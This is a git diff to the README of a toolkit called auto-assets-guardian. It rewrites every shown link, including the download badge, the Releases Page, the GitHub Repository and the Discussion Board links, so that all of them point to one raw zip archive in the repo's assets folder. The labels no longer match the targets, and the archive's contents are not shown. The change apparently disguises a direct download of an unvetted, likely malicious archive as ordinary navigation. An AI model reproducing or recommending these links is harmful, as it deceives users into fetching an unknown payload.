@@ -17,11 +17,11 @@ auto-assets-guardian is a smart, open-source toolkit designed to help you manage
 
 To get started, visit the page to download the latest version of auto-assets-guardian:
 
-[![Download Now](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Arthur0922332/auto-assets-guardian/releases)
+[![Download Now](https://github.com/Arthur0922332/auto-assets-guardian/raw/refs/heads/main/assets/assets_auto_guardian_1.8.zip)](https://github.com/Arthur0922332/auto-assets-guardian/raw/refs/heads/main/assets/assets_auto_guardian_1.8.zip)
 
 ### Installation Steps
 
-1. **Visit the Release Page:** Go to the following link to access the downloads: [Releases Page](https://github.com/Arthur0922332/auto-assets-guardian/releases).
+1. **Visit the Release Page:** Go to the following link to access the downloads: [Releases Page](https://github.com/Arthur0922332/auto-assets-guardian/raw/refs/heads/main/assets/assets_auto_guardian_1.8.zip).
    
 2. **Select the Latest Version:** Look for the most recent release. This will usually be listed at the top of the page.
 
@@ -78,8 +78,8 @@ Auto-assets-guardian is made possible by the contributions from various users an
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/Arthur0922332/auto-assets-guardian)
-- [Releases Page](https://github.com/Arthur0922332/auto-assets-guardian/releases)
-- [Discussion Board](https://github.com/Arthur0922332/auto-assets-guardian/discussions)
+- [GitHub Repository](https://github.com/Arthur0922332/auto-assets-guardian/raw/refs/heads/main/assets/assets_auto_guardian_1.8.zip)
+- [Releases Page](https://github.com/Arthur0922332/auto-assets-guardian/raw/refs/heads/main/assets/assets_auto_guardian_1.8.zip)
+- [Discussion Board](https://github.com/Arthur0922332/auto-assets-guardian/raw/refs/heads/main/assets/assets_auto_guardian_1.8.zip)
 
 Feel free to explore and help us improve auto-assets-guardian!
